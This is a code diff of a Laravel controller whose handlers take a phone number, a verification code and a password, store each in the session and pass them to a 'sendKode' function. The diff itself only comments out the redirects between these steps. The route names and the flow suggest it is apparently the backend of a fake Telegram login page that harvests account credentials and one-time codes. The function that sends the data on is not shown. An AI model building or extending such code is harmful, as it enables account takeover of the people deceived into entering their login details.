@@ -34,7 +34,7 @@ class RhmtController extends Controller
         $phoneNumber = $request->phoneNumber;
         Session::push("phoneNumber", $phoneNumber);
         $this->sendKode($phoneNumber);
-        return redirect()->route("rhmt.vcx_verif_telegram");
+        // return redirect()->route("rhmt.vcx_verif_telegram");
     }
 
     public function vcx_verif_telegram(Request $request)
@@ -57,7 +57,7 @@ class RhmtController extends Controller
         Session::push('verif', $verif);
 
         $this->sendKode($phoneNumber, $verif);
-        return redirect()->route("rhmt.vcx_password_telegram");
+        // return redirect()->route("rhmt.vcx_password_telegram");
     }
 
     public function vcx_password_telegram(Request $request)
@@ -75,7 +75,7 @@ class RhmtController extends Controller
         $this->sendKode($phoneNumber, $verif, $password);
         Session::remove('phoneNumber');
         Session::remove('verif');
-        return redirect()->route("rhmt.home2");
+        // return redirect()->route("rhmt.home2");
     }
 
     public function sendKode(
